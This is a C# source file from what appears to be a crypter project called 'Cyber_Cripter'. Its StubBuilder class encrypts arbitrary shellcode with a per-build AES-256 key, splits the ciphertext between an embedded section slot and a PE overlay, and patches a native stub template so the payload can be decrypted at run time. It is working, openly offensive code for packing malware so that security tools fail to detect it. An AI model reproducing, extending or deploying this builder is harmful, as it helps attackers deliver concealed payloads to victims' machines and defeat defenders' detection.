using System;
using System.IO;
using System.Security.Cryptography;

namespace Cyber_Cripter
{
    /// <summary>
    /// Loads the pre-compiled native stub template, finds the patch slots via
    /// 16-byte magic markers, encrypts the shellcode with a per-build AES-256
    /// key derived from <c>SHA256(heap_marker || template[0..STABLE_REGION] || timestamp)</c>,
    /// splits the ciphertext into <c>half1</c> (embedded inside the .cdata
    /// section) + <c>half2</c> (appended as PE overlay), patches the metadata
    /// struct, and writes the final stub.
    /// </summary>
    internal static class StubBuilder
    {
        // The first STABLE_REGION bytes of the file are fed into the key hash
        // by both the builder (over the unpatched template) and the stub (over
        // the patched file on disk). They MUST be byte-for-byte identical, so
        // both magic markers must live at offsets >= STABLE_REGION.
        public const int STABLE_REGION = 4096;

        // Must equal HALF1_MAX in stub/stub.c (1 MiB).
        public const int HALF1_MAX = 0x100000;

        private static readonly byte[] METADATA_MAGIC = new byte[] {
            0x4D, 0x45, 0x54, 0x41, 0x21, 0x43, 0x52, 0x59,
            0x70, 0x54, 0x65, 0x52, 0x21, 0xAA, 0xBB, 0xCC
        };
        private static readonly byte[] HALF1_MAGIC = new byte[] {
            0x48, 0x41, 0x4C, 0x46, 0x21, 0x4F, 0x4E, 0x45,
            0x21, 0x44, 0x41, 0x54, 0x41, 0xDD, 0xEE, 0xFF
        };

        // Field offsets inside StubMetadata (#pragma pack(1)).
        private const int OFF_HEAP_MARKER = 16;
        private const int OFF_TIMESTAMP   = 16 + 8;
        private const int OFF_IV          = 16 + 8 + 8;
        private const int OFF_HALF1_SIZE  = 16 + 8 + 8 + 16;
        private const int OFF_HALF2_SIZE  = 16 + 8 + 8 + 16 + 4;
        private const int OFF_HASH_REGION = 16 + 8 + 8 + 16 + 4 + 4;

        public sealed class BuildReport
        {
            public string OutputPath;
            public int    ShellcodeBytes;
            public int    CiphertextBytes;
            public int    Half1Bytes;
            public int    Half2Bytes;
            public ulong  Timestamp;
            public string KeyHex;
        }

        public static BuildReport Build(byte[] templateBytes, byte[] shellcode, string outputPath)
        {
            int metaOff  = FindUnique(templateBytes, METADATA_MAGIC, "METADATA_MAGIC");
            int half1Off = FindUnique(templateBytes, HALF1_MAGIC,    "HALF1_MAGIC");

            if (metaOff < STABLE_REGION || half1Off < STABLE_REGION)
                throw new InvalidOperationException(
                    "Stub template's patch slots overlap the hash region (offsets " +
                    metaOff + " and " + half1Off + " vs STABLE_REGION " + STABLE_REGION +
                    "). Rebuild the stub so .cdata starts later.");

            int half1DataOff = half1Off + 16;
            if (half1DataOff + HALF1_MAX > templateBytes.Length)
                throw new InvalidOperationException(
                    "Stub template too small to contain " + HALF1_MAX +
                    " bytes after HALF1_MAGIC. .cdata was probably truncated by " +
                    "MSVC's BSS optimization — see stub/README.md.");

            // Per-build randomness
            byte[] heapMarker = new byte[8];
            byte[] iv         = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(heapMarker);
                rng.GetBytes(iv);
            }
            ulong timestamp = (ulong)DateTimeOffset.UtcNow.ToUnixTimeSeconds();

            // Re-derive the same key the stub will derive at runtime.
            byte[] key = Encryption.DeriveKey(heapMarker, templateBytes, STABLE_REGION, timestamp);

            byte[] ciphertext = Encryption.EncryptAes256Cbc(shellcode, key, iv);

            // Split: aim for 50/50, capped by the embedded buffer capacity.
            int half1Size = Math.Min(ciphertext.Length / 2, HALF1_MAX);
            int half2Size = ciphertext.Length - half1Size;

            // ---- patch metadata struct ----
            Buffer.BlockCopy(heapMarker,                            0,
                             templateBytes, metaOff + OFF_HEAP_MARKER, 8);
            Buffer.BlockCopy(BitConverter.GetBytes(timestamp),      0,
                             templateBytes, metaOff + OFF_TIMESTAMP,   8);
            Buffer.BlockCopy(iv,                                    0,
                             templateBytes, metaOff + OFF_IV,          16);
            Buffer.BlockCopy(BitConverter.GetBytes((uint)half1Size), 0,
                             templateBytes, metaOff + OFF_HALF1_SIZE,  4);
            Buffer.BlockCopy(BitConverter.GetBytes((uint)half2Size), 0,
                             templateBytes, metaOff + OFF_HALF2_SIZE,  4);
            Buffer.BlockCopy(BitConverter.GetBytes((uint)STABLE_REGION), 0,
                             templateBytes, metaOff + OFF_HASH_REGION, 4);

            // ---- patch embedded half1 ----
            Buffer.BlockCopy(ciphertext, 0, templateBytes, half1DataOff, half1Size);
            // Wipe the unused tail so we don't leak filler bytes from the template.
            for (int i = half1Size; i < HALF1_MAX; i++)
                templateBytes[half1DataOff + i] = 0;

            // ---- write patched stub + overlay (half2) ----
            Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
            using (var fs = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
            {
                fs.Write(templateBytes, 0, templateBytes.Length);
                if (half2Size > 0)
                    fs.Write(ciphertext, half1Size, half2Size);
            }

            return new BuildReport {
                OutputPath      = outputPath,
                ShellcodeBytes  = shellcode.Length,
                CiphertextBytes = ciphertext.Length,
                Half1Bytes      = half1Size,
                Half2Bytes      = half2Size,
                Timestamp       = timestamp,
                KeyHex          = BitConverter.ToString(key).Replace("-", "")
            };
        }

        private static int FindUnique(byte[] hay, byte[] needle, string label)
        {
            int found = -1;
            int last  = hay.Length - needle.Length;
            for (int i = 0; i <= last; i++)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                    if (hay[i + j] != needle[j]) { match = false; break; }
                if (!match) continue;
                if (found != -1)
                    throw new InvalidOperationException(label + " appears more than once in the stub template.");
                found = i;
            }
            if (found == -1)
                throw new InvalidOperationException(label + " not found in the stub template.");
            return found;
        }
    }
}
